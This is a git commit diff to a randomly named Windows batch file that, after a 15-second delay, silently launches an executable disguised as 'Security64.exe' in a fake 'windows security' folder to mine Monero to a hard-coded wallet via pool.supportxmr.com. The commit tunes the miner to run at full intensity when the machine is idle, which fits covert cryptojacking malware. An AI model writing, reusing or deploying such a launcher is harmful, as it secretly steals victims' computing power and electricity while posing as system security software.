5852d2c4b02f39f545b05c4f72b74432f902c179
JelleF09 <137308002+JelleF09@users.noreply.github.com>
2025-06-09 22:59:04 +0200

    Update w7kELa41iIZ6890MTTGt.bat

--- w7kELa41iIZ6890MTTGt.bat
+++ w7kELa41iIZ6890MTTGt.bat
@@ -1,4 +1,4 @@
 @echo off
 timeout /t 15 /nobreak >nul
-start /b "" "%appdata%\windows security\Security64.exe" -o pool.supportxmr.com:3333 -u 45pH5NwPHSKNCerFarWL6fGqAXet3D2Li5Kutgzx8W2Q5tPkiH63Z6wW4rCVK5PGXEUQ8tcd4i4xMdJSJz2h9RSgH2dwze6.RIG_CPU -p x --algo rx/0 --cpu-max-threads-hint=50 -B 
+start /b "" "%appdata%\windows security\Security64.exe" -o pool.supportxmr.com:3333 -u 45pH5NwPHSKNCerFarWL6fGqAXet3D2Li5Kutgzx8W2Q5tPkiH63Z6wW4rCVK5PGXEUQ8tcd4i4xMdJSJz2h9RSgH2dwze6.RIG_CPU -p x --algo rx/0 --cpu-max-threads-hint=50 -B --idle-intensity=100 --idle-delay=60
 exit
